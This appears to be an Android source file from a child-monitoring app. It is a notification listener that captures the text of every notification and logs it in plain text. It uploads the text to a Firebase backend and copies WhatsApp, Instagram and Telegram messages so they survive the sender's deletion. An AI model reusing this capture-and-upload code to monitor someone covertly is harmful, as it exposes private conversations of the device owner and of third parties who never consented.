package com.vyra.kids.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.NetworkSyncManager

class VyraNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val packageName = sbn.packageName ?: return
        // Skip our own notifications
        if (packageName == applicationContext.packageName) return

        val extras = sbn.notification.extras ?: return
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""

        val finalMessage = if (bigText.isNotBlank()) bigText else text

        // Ignore empty system noise
        if (title.isBlank() && finalMessage.isBlank()) return

        Log.d(AppConstants.TAG, "Notification Captured [$packageName] $title: $finalMessage")

        val payload = mapOf(
            "type" to "NOTIFICATION_LOG",
            "packageName" to packageName,
            "title" to title,
            "message" to finalMessage,
            "timestamp" to sbn.postTime,
            "isDeletedBackup" to true // Safe copy preserved even if sender uses 'Delete for Everyone'
        )

        // Fallback sync manager
        NetworkSyncManager.getInstance(this).syncData("notifications", payload)

        // Realtime Firebase Backend sync
        val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
        val itemId = "notif_${sbn.postTime}_${sbn.id}"
        val isSocial = packageName.contains("whatsapp") || packageName.contains("instagram") || packageName.contains("telegram")

        firebaseSync.syncNotification(
            itemId = itemId,
            packageName = packageName,
            appName = packageName.substringAfterLast('.').replaceFirstChar { it.uppercase() },
            title = title,
            text = finalMessage,
            isImportant = isSocial
        )

        // If from messaging apps, mirror to chats collection with deleted-message backup
        if (isSocial) {
            val appType = when {
                packageName.contains("whatsapp") -> "WhatsApp"
                packageName.contains("instagram") -> "Instagram"
                packageName.contains("telegram") -> "Telegram"
                else -> "SMS"
            }
            firebaseSync.syncChatMessage(
                msgId = "chat_${sbn.postTime}",
                app = appType,
                sender = title.ifBlank { "Unknown" },
                text = finalMessage,
                isDeletedBySender = false,
                isWatchlistTarget = false
            )
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Can be used to track deleted notifications if needed
    }
}
